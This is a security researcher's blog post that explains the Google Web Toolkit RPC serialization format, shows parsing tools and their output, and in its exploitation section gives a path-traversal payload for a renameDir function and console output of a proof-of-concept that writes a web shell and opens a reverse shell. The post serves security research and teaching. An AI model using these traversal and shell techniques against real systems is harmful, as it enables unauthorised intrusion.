---
layout: post
title: "From Serialized to Shell :: Auditing Google Web Toolkit"
date: 2017-04-27 12:00:00 -0600
categories: blog
---

![](/assets/images/from-serialized-to-shell/gwt.png) 

Recently I have been looking for vulnerabilities in a target that has some API's developed with the Google Web Toolkit framework. This is the second time I've come up against a target using this technology so I figured it was about time I took some notes.

Its sufficient to say, that I have finally upheld my word. This blog post is more of a reference to my future self, but if some people get something out of it, then more power to them!
<!--more-->

TL;DR; *I developed a tool that will blindly fingerprint a non-obfuscated GWT cache file and generate basic GWT serialized strings, ready for auditing. You can read the [Conclusion](#conclude) and get the code.*

### Overview

- [Past Research](#past-research)
- [Examples of GWT-RPC requests](#examples-of-gwt-rpc-requests)
   - [Single parameter: String](#single-parameter-string)
   - [Single parameter: ArrayList](#single-parameter-arraylist)
   - [Multiple parameters: ArrayList, String](#multiple-parameters-arraylist-string)
   - [Multiple parameters: Integer, ArrayList](#multiple-parameters-integer-arraylist)
   - [Multiple parameters: Long, ArrayList (with multiple elements)](#multiple-parameters-long-arraylist-with-multiple-elements)
   - [Single parameter: Person (Java complex type)](#single-parameter-person-java-complex-type)
- [Tools](#tools)
- [Parsing](#parsing)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

Before we begin, lets take a quick look at some past research.

### Past Research

Ron Gutierrez presented some research titled ["Unlocking the Toolkit"][attackinggwt] and developed some [tools][toolkit] that parse serialized GWT strings and discover functions from remote. Other's such as Brian Slesinsky have developed a document detailing the [GWT-RPC wire protocol][gwtrpc] and even has a [google group][group] dedicated to GWT users.

### Examples of GWT-RPC requests

Let's first see a few examples so that we can understand this protocol a little better.

#### Single parameter: String

Here is a request that that sends a single String as the value `test`.

```
POST /helloworld/greet HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: text/x-gwt-rpc; charset=utf-8
X-GWT-Permutation: D2C7F3E484D56542BBA3578DC8C1B447
X-GWT-Module-Base: http://127.0.0.1:8888/helloworld/
Content-Length: 224
Connection: close

7|0|6|http://127.0.0.1:8888/helloworld/|95F17E12D4B90695D035873A418208A8|com.example.test.client.GreetingService|greetServer|java.lang.String/2004016611|test|1|2|3|4|1|5|6|
```

We can examine what is happening if we break down the serialized string by pipe `|`.

- `7` is the stream version.
- `0` is the flags.
- `6` is the number of strings in the serialized request
- `http://127.0.0.1:8888/helloworld/` is the endpoint
- `95F17E12D4B90695D035873A418208A8` is the strong name. Not to be confused with a CSRF token.
- `com.example.test.client.GreetingService` is the endpoint client
- `greetServer` is the function name, implemented by the client/server
- `java.lang.String/2004016611` is the first parameter denoting the type.
- `test` is the value of the first parameter.
- `1|2|3|4` is the first 4 elements of the string.
- `1` is the number of arguments to the function
- `5|6` is the parameter type and value (java.lang.String/2004016611 and test)

Here is the corrosponding function implimentation:

```java
@RemoteServiceRelativePath("greet")
public interface GreetingService extends RemoteService {
    String greetServer(String param1) throws IllegalArgumentException;
}
```

#### Single parameter: ArrayList

Here is a request that that sends a single List of type ArrayList containing a String value `test`.

```
POST /helloworld/greet HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: text/x-gwt-rpc; charset=utf-8
X-GWT-Permutation: D2C7F3E484D56542BBA3578DC8C1B447
X-GWT-Module-Base: http://127.0.0.1:8888/helloworld/
Content-Length: 224
Connection: close

7|0|8|http://127.0.0.1:8888/helloworld/|0AA7A0C25ADF167CC648926141094922|com.example.test.client.GreetingService|greetServer|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test|1|2|3|4|1|5|6|1|7|8|
```

Again, we can examine what is happening if we break down the serialized string. We will skip up to the function name, since we know what those values are already:

- `8` is the number of strings in the serialized request
- `java.util.List` is the first variable. Since it is a list, the next parameter specifies the type that is accepted.
- `java.util.ArrayList/4159755760` is the List implimentation that is accepted by the client interface.
- `java.lang.String/2004016611` is the type of ArrayList (`List<String>`) that is contained within the ArrayList
- `test` is the value of the first element of the ArrayList.
- `1|2|3|4` is the first 4 elements of the string.
- `1` is the number of arguments to the function
- `5|6` is the List and ArrayList implimentation (java.util.List and java.util.ArrayList/4159755760 values)
- `1` is the number of elements in the ArrayList
- `7|8` is the ArrayList type and its elements.

Here is the corrosponding function implimentation:

```java
@RemoteServiceRelativePath("greet")
public interface GreetingService extends RemoteService {
    String greetServer(List<String> param1) throws IllegalArgumentException;
}
```

#### Multiple parameters: ArrayList, String

So, what if we send multiple parameters? Let's use the following example:

```
POST /helloworld/greet HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: text/x-gwt-rpc; charset=utf-8
X-GWT-Permutation: D2C7F3E484D56542BBA3578DC8C1B447
X-GWT-Module-Base: http://127.0.0.1:8888/helloworld/
Content-Length: 224
Connection: close

7|0|9|http://127.0.0.1:8888/helloworld/|0AA7A0C25ADF167CC648926141094922|com.example.test.client.GreetingService|greetServer|java.util.List|java.lang.String/2004016611|java.util.ArrayList/4159755760|GWT User|wtf|1|2|3|4|2|5|6|7|1|6|8|9|
```

This is the same example above, the only difference is that the addition of a string argument.

- `9` is the number of strings in the serialized request
- `2` is now the number of arguments to the function
- `9` is the extra String value

```java
@RemoteServiceRelativePath("greet")
public interface GreetingService extends RemoteService {
    String greetServer(List<String> param1, String param2) throws IllegalArgumentException;
}
```

#### Multiple parameters: Integer, ArrayList

So, what if we send multiple parameters? Let's use the following example:

```
POST /helloworld/greet HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: text/x-gwt-rpc; charset=utf-8
X-GWT-Permutation: 698BA15C24E28FA9B080002C35A1FA05
X-GWT-Module-Base: http://127.0.0.1:8888/helloworld/
Content-Length: 224
Connection: close

7|0|9|http://127.0.0.1:8888/helloworld/|43127AF533854D6F99980CB5572AEC0E|com.example.test.client.GreetingService|greetServer|java.lang.Integer/3438268394|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test|1|2|3|4|2|5|6|5|99|7|1|8|9|
```

This is the same example above, the only difference is that an Integer type is used and it is now the first parameter.

- `9` is the number of strings in the serialized request
- `2` is now the number of arguments to the function
- `5|6` are the arguments to the function (java.lang.Integer/3438268394, java.util.List)
- `5` is the read in value of the Integer
- `99` is the Integer value. This can be tampered with.
- `7` is the ArrayList implimentation (the second parameter).
- `1` is the number of elements in the ArrayList.
- `8` is the ArrayList type (`ArrayList<String>`, referencing java.lang.String/2004016611)
- `9` is the elements value (test) 

```java
@RemoteServiceRelativePath("greet")
public interface GreetingService extends RemoteService {
    String greetServer(Integer param1, List<String> name) throws IllegalArgumentException;
}
```

#### Multiple parameters: Long, ArrayList (with multiple elements)

So, what if we send multiple elements in our ArrayList and throw in a Long for good measure?

```
POST /helloworld/greet HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: text/x-gwt-rpc; charset=utf-8
X-GWT-Permutation: 698BA15C24E28FA9B080002C35A1FA05
X-GWT-Module-Base: http://127.0.0.1:8888/helloworld/
Content-Length: 224
Connection: close

7|0|10|http://127.0.0.1:8888/helloworld/|5BA0C1B0BB61A2FFF68C4B4FAE5F9D16|com.example.test.client.GreetingService|greetServer|java.lang.Long/4227064769|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test1|test2|1|2|3|4|2|5|6|5|D4O|7|2|8|9|8|10|
```

This is the same example above, the only difference is that an Long type is used there are now multiple elements in the ArrayList.

- `10` is the number of strings in the serialized request
- `2` there are 2 arguments to the function
- `5|6` are the arguments to the function (java.lang.Long/4227064769, java.util.List)
- `5` is the read in value of the Long
- `D40` is the Long value. This can be tampered with, we will get to what this value is later.
- `7` is the ArrayList implimentation (the second parameter).
- `2` is the number of elements in the ArrayList.
- `8` is the ArrayList type (`ArrayList<String>`, referencing java.lang.String/2004016611)
- `9` is the first element value (test1) 
- `8` is the ArrayList type (`ArrayList<String>`, referencing java.lang.String/2004016611)
- `10` is the second element value (test2)

```java
@RemoteServiceRelativePath("greet")
public interface GreetingService extends RemoteService {
    String greetServer(Long param1, List<String> param2) throws IllegalArgumentException;
}
```

So, what is the `D40` Long value? It turns out that its an base64 [RFC-4648][rfc] implimentation of the Long value. It can be decoded with a little python:

```py
#!/usr/local/bin/python

import sys
import math
import string

if len(sys.argv) < 2:
    print "%s <code>" % sys.argv[0]
    sys.exit(-1)

value   = sys.argv[1]
rfc4648 = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)

def decode(code):
    num = 0
    i = len(code)-1

    for c in code:
        num += int(rfc4648.index(c)*math.pow(64, i))
        i -= 1
    return int(num)

print decode(value) 
```

```
saturn:~ mr_me$ ./poc.py D4O
15886
```

This means that 15886 was the long value sent to this function on the server-side.

#### Single parameter: Person (Java complex type)

Check out the excellent example [here][example] for learning how to serialize complex data types. Note that if you wish to send custom complex types to GWT endpoints, you will need to audit the source code of the target. Performing a white-box test is a requirement in that case so that you can determine the custom object's properties.

### Tools

The [GWT-Penetration-Testing-Toolset][toolkit] was developed by Ron as part of his research. The tools work quite well.

#### gwtparse

This tool will take a serialized GWT string and attempt to parse it in order to find all the string locations in the rquest in order for us to test the server-side code for vulnerabilities. Nice is you **already** have a serialized string.

```bash
saturn:gwtparse mr_me$ python gwtparse.py -b -p -i "7|0|10|http://127.0.0.1:8888/helloworld/|5BA0C1B0BB61A2FFF68C4B4FAE5F9D16|com.example.test.client.GreetingService|greetServer|java.lang.Long/4227064769|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test1|test2|1|2|3|4|2|5|6|5|99|7|2|8|9|8|10|"

Serialized Object:
7|0|10|http://127.0.0.1:8888/helloworld/|5BA0C1B0BB61A2FFF68C4B4FAE5F9D16|com.example.test.client.GreetingService|greetServer|java.lang.Long/4227064769|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test1|test2|1|2|3|4|2|5|6|5|99|7|2|8|9|8|10|

Stream Version: 7
         Flags: 0
Column Numbers: 10
          Host: http://127.0.0.1:8888/helloworld/
          Hash: 5BA0C1B0BB61A2FFF68C4B4FAE5F9D16
    Class Name: com.example.test.client.GreetingService
        Method: greetServer
   # of Params: 2

    Parameters:
{'flag': False,
 'is_array': False,
 'is_custom_obj': False,
 'is_list': False,
 'typename': 'java.lang.Long/4227064769',
 'values': ['99.07.0']}
{'flag': False,
 'is_array': False,
 'is_custom_obj': True,
 'is_list': False,
 'typename': 'java.util.List',
 'values': ['test1', 'test2']}

GWT RPC Payload Fuzz String

7|0|10|http://127.0.0.1:8888/helloworld/|5BA0C1B0BB61A2FFF68C4B4FAE5F9D16|com.example.test.client.GreetingService|greetServer|java.lang.Long/4227064769|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|§test1§|§test2§|1|2|3|4|2|5|6|5|§99§|§7§|2|8|9|8|10|
```

The -b burp option is nice. Your serialized string contains the § characters so you can plug the request straight into the intruder and vulnerability scan away.

#### gwtenum

After having to make some changes to the code to support HTTPS, it turns out that gwtenum.py only works on a few endpoints.

```bash
saturn:gwtenum mr_me$ 
saturn:gwtenum mr_me$ ./gwtenum.py -k "JSESSIONID=D6D5B3A7ECE0FEF704F93249A7AD3AF6" -u https://abc.xyz/some_gwt/some_gwt.nocache.js
Analyzing https://abc.xyz/some_gwt/044D2FD1794AE52D7832F10410461CB4.cache.html


===========================
Enumerated Methods
===========================




saturn:gwtenum mr_me$ ./gwtenum.py -k "JSESSIONID=D6D5B3A7ECE0FEF704F93249A7AD3AF6" -u https://abc.xyz/some_other_gwt/some_other_gwt.nocache.js
Analyzing https://abc.xyz/some_other_gwt/40A11A6CC6A8F2204BD8945E7647603B.cache.html


===========================
Enumerated Methods
===========================

GettingGraphItemService.createMonitorItemGettingBean( )
GettingGraphItemService.createMonitorItemGettingBean( J,java.util.List )
GettingGraphItemService.getGraphItem( )
GettingMonitorInformationService.getAllMonitors( )
GettingMonitorInformationService.getAvailMonitorItemCnt( )
GettingMonitorInformationService.request( xxx.ReqMessage/136736496 )
GettingOperatorGroupService.getCurrOperatorGroupId( )
GettingOperatorGroupService.getCurrOperatorId( )
GettingOperatorGroupService.getDevDscr( java.lang.String/2004016611,java.util.List )
GettingOperatorGroupService.turnGroupData( )
```

This is because the code assumes an obfuscated format of the cache files. Here are examples of a few functions within the some_other_gwt's endpoint cache file.

```js
function XK(b,c,d){return VK(c,d,UK(b,d),TK(b,d),null)}
function Ws(b){return b>=33&&b<=40||b==27||b==13||b==9}
function MTc(b){b.e=[];b.k={};b.i=false;b.g=null;b.j=0}
function UB(b){if(b.e){b.d.Pe(false);b.b=null;b.c=null}}
function p_(b,c){Ix(b.c);c>0?Jx(b.c,c):b.c.b.b.Ud(null)}
function U5(b,c){BH(b.b,Cp(c),c);GB(b,(JQ(),dQ),new DN)}
function sWc(b){b.b=QXb(dbc,{93:1,109:1,111:1},0,0,0)}
function QIb(){this.d=RXb(eac,{93:1,111:1},-1,[15,18])}
function sT(b){this.o=b;this.b=50;this.c=new AT(this,b)}
function Uqc(b){this.b=new Irc(this);this.bd=b;Jo(this)}
function ywc(b){this.i=new Cu(this);this.j=b;this.c=pvd}
function Ewc(b){this.i=new Cu(this);this.j=b;this.c=pvd}
```

When in reality, I was trying to parse the non-obfuscated **some_gwt's** cache file. Here is an example of a function within this cache file:

```js
function $renameDir(this$static, oldName, newName, callback){
  var $e0, payload, statsContext, streamWriter;
  statsContext = new RpcStatsContext_0;
  !!$stats && $stats({moduleName:$moduleName, sessionId:$sessionId, subSystem:'rpc', evtGroup:statsContext.requestId, method:'MIBFileService_Proxy.renameDir', millis:(new Date).getTime(), type:'begin'});
  streamWriter = $createStreamWriter(this$static);
  try {
    append(streamWriter.encodeBuffer, '' + $addString(streamWriter, 'xxx.MIBFileService'));
    append(streamWriter.encodeBuffer, '' + $addString(streamWriter, 'renameDir'));
    append(streamWriter.encodeBuffer, '2');
    append(streamWriter.encodeBuffer, '' + $addString(streamWriter, 'java.lang.String/2004016611'));
    append(streamWriter.encodeBuffer, '' + $addString(streamWriter, 'java.lang.String/2004016611'));
    append(streamWriter.encodeBuffer, '' + $addString(streamWriter, oldName));
    append(streamWriter.encodeBuffer, '' + $addString(streamWriter, newName));
    payload = $toString_10(streamWriter);
    !!$stats && $stats({moduleName:$moduleName, sessionId:$sessionId, subSystem:'rpc', evtGroup:statsContext.requestId, method:'MIBFileService_Proxy.renameDir', millis:(new Date).getTime(), type:'requestSerialized'});
    $doInvoke(this$static, ($clinit_781() , INT), 'MIBFileService_Proxy.renameDir', statsContext, payload, callback);
  }
   catch ($e0) {
    $e0 = caught_0($e0);
    if (!instanceOf($e0, 226))
      throw $e0;
  }
}
```

As you can see, the above JavaScript looks a little more strutured which will make it easier when we want to parse it. So I developed a parser that will also generate the GWT serialized string for these non-obfuscated cache files.

### Parsing

```bash
saturn:~ mr_me$ ./gwt.py -c JSESSIONID:D6D5B3A7ECE0FEF704F93249A7AD3AF6 -u https://abc.xyz/some_other_gwt/some_other_gwt.nocache.js

| GWT generator - mr_me 2017 |

(+) parsing 9E618EE9F5D2949BDC9B848BAE0C6C2A.cache.html...

saturn:~ mr_me$ ./gwt.py -c JSESSIONID:D6D5B3A7ECE0FEF704F93249A7AD3AF6 -u https://abc.xyz/some_gwt/some_gwt.nocache.js

| GWT generator - mr_me 2017 |

(+) parsing EA595041C3D0ECAA75FAA7D8AAF0DE5A.cache.html...

(01) function: configSnmp 
(01) number of parameters: 0 
(01) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingDeviceService|configSnmp|1|2|3|4|0|

(02) function: createDeviceItemGettingBean 
(02) number of parameters: 0 
(02) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingDeviceService|createDeviceItemGettingBean|1|2|3|4|0|

(03) function: createSnmpConfigBean 
(03) number of parameters: 1 
(03) parameters: device 
(03) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingDeviceService|createSnmpConfigBean|xx.DeviceItem/394618249|%s|1|2|3|4|1|5|6|

(04) function: getDevice 
(04) number of parameters: 0 
(04) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingDeviceService|getDevice|1|2|3|4|0|

(05) function: getDevice 
(05) number of parameters: 1 
(05) parameters: deviceID 
(05) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingDeviceService|getDevice|J|%s|1|2|3|4|1|5|6|

(06) function: getCurrentOperatorId 
(06) number of parameters: 0 
(06) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingUserTypeService|getCurrentOperatorId|1|2|3|4|0|

(07) function: getMIBInfoByUserName 
(07) number of parameters: 1 
(07) parameters: userID 
(07) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingUserTypeService|getMIBInfoByUserName|java.lang.String/2004016611|%s|1|2|3|4|1|5|6|

(08) function: isReadOnlyUser 
(08) number of parameters: 0 
(08) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingUserTypeService|isReadOnlyUser|1|2|3|4|0|

(09) function: saveCurrentUserMIBInfo 
(09) number of parameters: 2 
(09) parameters: userID, moduleList 
(09) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.GettingUserTypeService|saveCurrentUserMIBInfo|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|1|2|3|4|2|5|6|7|8|

(10) function: deleteDir 
(10) number of parameters: 1 
(10) parameters: dirName 
(10) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|deleteDir|java.lang.String/2004016611|%s|1|2|3|4|1|5|6|

(11) function: deleteFile 
(11) number of parameters: 2 
(11) parameters: dirName, fileName 
(11) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|deleteFile|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|1|2|3|4|2|5|6|7|8|

(12) function: exportQueryResult 
(12) number of parameters: 1 
(12) parameters: queryResults 
(12) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|exportQueryResult|java.lang.String/2004016611|%s|1|2|3|4|1|5|6|

(13) function: getCompilationResult 
(13) number of parameters: 0 
(13) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|getCompilationResult|1|2|3|4|0|

(14) function: getDefaultLoadedMIBModuleNames 
(14) number of parameters: 1 
(14) parameters: maxFileNum 
(14) GWT: 6|0|5|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|getDefaultLoadedMIBModuleNames|java.lang.Integer/3438268394|1|2|3|4|1|5|5|%d|

(15) function: getMibFileContent 
(15) number of parameters: 2 
(15) parameters: dirName, fileName 
(15) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|getMibFileContent|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|1|2|3|4|2|5|6|7|8|

(16) function: getMibFileList 
(16) number of parameters: 0 
(16) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|getMibFileList|1|2|3|4|0|

(17) function: getMibFileNames 
(17) number of parameters: 0 
(17) GWT: 6|0|4|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|getMibFileNames|1|2|3|4|0|

(18) function: loadMibModuleByName 
(18) number of parameters: 2 
(18) parameters: dirName, moduleName 
(18) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|loadMibModuleByName|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|1|2|3|4|2|5|6|7|8|

(19) function: newDir 
(19) number of parameters: 1 
(19) parameters: dirName 
(19) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|newDir|java.lang.String/2004016611|%s|1|2|3|4|1|5|6|

(20) function: renameDir 
(20) number of parameters: 2 
(20) parameters: oldName, newName 
(20) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|renameDir|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|1|2|3|4|2|5|6|7|8|

(21) function: requestMIBNodes 
(21) number of parameters: 1 
(21) parameters: mibNodeOID 
(21) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|requestMIBNodes|java.lang.String/2004016611|%s|1|2|3|4|1|5|6|

(22) function: sendBeanName 
(22) number of parameters: 1 
(22) parameters: beanName 
(22) GWT: 6|0|6|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MibWidgetService|sendBeanName|java.lang.String/2004016611|%s|1|2|3|4|1|5|6|

(23) function: setMibNodesInfo 
(23) number of parameters: 1 
(23) parameters: mibNodesList 
(23) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MibWidgetService|setMibNodesInfo|java.util.List|java.util.ArrayList|java.lang.String|%s|1|2|3|4|1|5|6|7|8|

(24) function: get 
(24) number of parameters: 2 
(24) parameters: device, nodeOIDs 
(24) GWT: 6|0|10|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.SNMPService|get|xx.DeviceItem/394618249|java.util.List|java.util.ArrayList|java.lang.String|%s|%s|1|2|3|4|2|5|6|7|8|9|10|

(25) function: getNext 
(25) number of parameters: 2 
(25) parameters: device, nodeOIDs 
(25) GWT: 6|0|10|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.SNMPService|getNext|xx.DeviceItem/394618249|java.util.List|java.util.ArrayList|java.lang.String|%s|%s|1|2|3|4|2|5|6|7|8|9|10|

(26) function: record 
(26) number of parameters: 4 
(26) parameters: device, beginOid, endOid, fileName 
(26) GWT: 6|0|12|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.SNMPService|record|xx.DeviceItem/394618249|java.lang.String/2004016611|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|%s|%s|1|2|3|4|4|5|6|7|8|9|10|11|12|

(27) function: set 
(27) number of parameters: 4 
(27) parameters: device, oidsToSet, valueToSet, syntax 
(27) GWT: 6|0|18|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.SNMPService|set|xx.DeviceItem/394618249|java.util.List|java.util.ArrayList|java.lang.String|java.util.List|java.util.ArrayList|java.lang.String|java.util.List|java.util.ArrayList|java.lang.String|%s|%s|%s|%s|1|2|3|4|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|
```

Quite mode also works:

```bash
saturn:~ $ ./gwt.py -q -c JSESSIONID:D6D5B3A7ECE0FEF704F93249A7AD3AF6 -u https://abc.xyz/some_gwt/some_gwt.nocache.js

| GWT generator - mr_me 2017 |

(+) parsing 80F7BC053CE9C312BE6BA81EEEEB70FC.cache.html...

(01) function: configSnmp 
(02) function: createDeviceItemGettingBean 
(03) function: createSnmpConfigBean 
(04) function: getDevice 
(05) function: getDevice 
(06) function: getCurrentOperatorId 
(07) function: getMIBInfoByUserName 
(08) function: isReadOnlyUser 
(09) function: saveCurrentUserMIBInfo 
(10) function: deleteDir 
(11) function: deleteFile 
(12) function: exportQueryResult 
(13) function: getCompilationResult 
(14) function: getDefaultLoadedMIBModuleNames 
(15) function: getMibFileContent 
(16) function: getMibFileList 
(17) function: getMibFileNames 
(18) function: loadMibModuleByName 
(19) function: newDir 
(20) function: renameDir 
(21) function: requestMIBNodes 
(22) function: sendBeanName 
(23) function: setMibNodesInfo 
(24) function: get 
(25) function: getNext 
(26) function: record 
(27) function: set 
```

So we can see that `gwt.py` will not parse cache files that are obfuscated, you will have to use `gwtenum.py` for that.

#### <a id="exploits"></a>Exploitation

Several functions were vulnerable to different types of attacks but one of the interesting functions I came across, was the renameDir function. This function either wasn't implemented in the actual UI of the target or at the very least I couldn't find it. This is not an issue because as long at the client MIBFileService class impliments it, we can reach it. We can use `gwt.py` to generate the GWT serialized string for us.

```bash
(20) function: renameDir 
(20) number of parameters: 2 
(20) parameters: oldName, newName 
(20) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|renameDir|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|1|2|3|4|2|5|6|7|8|
```

The code tells us the parameters, **oldName** and **newName** so my natural instict is to try and attack the endpoint using traversals. I didn't even bother looking at the server-side code for this function.

```
6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|renameDir|java.lang.String|java.lang.String|../../../../../from_some_folder|../../to_some_other_folder|1|2|3|4|2|5|6|7|8|
```

After bypassing the authentication using other vulnerabilities, it turns out, I can leverage this to achieve remote code execution against my target.

```
saturn:~ mr_me$ ./poc.py 172.16.175.148 172.16.175.1:4444

  Some Target Remote Code Execution Zero Day
  mr_me 2017

(1) bypassing authentication...
(2) leaking a user session...
(+) leaked session: D6D5B3A7ECE0FEF704F93249A7AD3AF6
(3) leaking the viewState...
(4) writing a shell...
(5) rewriting shell location...
(6) executing shell...
(+) starting handler on port 4444
(+) connection from 172.16.175.148
(+) pop thy shell!
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\System32>whoami
whoami
nt authority\system

C:\Windows\System32>
```

This is possible because many applications allow users to upload potentially malicious files (think PHP, JSP, ASP, etc) with controlled/semi-controlled content, outside of the webroot.

The developer's mindset is that, if the code is outside of the webroot, in a fixed location, there is no way for an attacker to reach it. Using a [rename][CVE-2015-2606] primitive is a powerful way to achieve code execution, because it fully side steps the developers assumptions.

So all we need to do is "rename" the directory, in reality, move the directory where our backdoor is into a web accessible location.

#### Conclusion

Testing GWT from a white-box perspective is certainly easier than from a black-box. If you are testing from a white-box perspective, you can decompile the XYZService (client) and the XYZServiceImpl (server) classes and can discover all the implemented functions, their arguments and their type definitions.

However, unless we can directly interact with that service, we will still need to find a way to generate the GWT serialized strings to be able to test the endpoints.
Attacking GWT functions using primitive types in Java is typically easy enough, the complexity arises when the endpoint expects serialized complex types. You can download the `gwt.py` from the [github][gwt.py] account.

[attackinggwt]: https://www.owasp.org/images/7/77/Attacking_Google_Web_Toolkit.ppt
[gwtrpc]: https://docs.google.com/document/d/1eG0YocsYYbNAtivkLtcaiEE5IOF5u4LUol8-LL0TIKU/
[group]: https://groups.google.com/forum/?fromgroups#!forum/google-web-toolkit
[rfc]: http://www.rfc-editor.org/rfc/rfc4648.txt
[toolkit]: https://github.com/GDSSecurity/GWT-Penetration-Testing-Toolset
[CVE-2015-2606]: http://www.zerodayinitiative.com/advisories/ZDI-15-352/
[gwt.py]: https://github.com/sourceincite/tools/blob/master/gwt.py
[example]: https://docs.google.com/document/d/1eG0YocsYYbNAtivkLtcaiEE5IOF5u4LUol8-LL0TIKU/edit#heading=h.nwvro3zaq0ks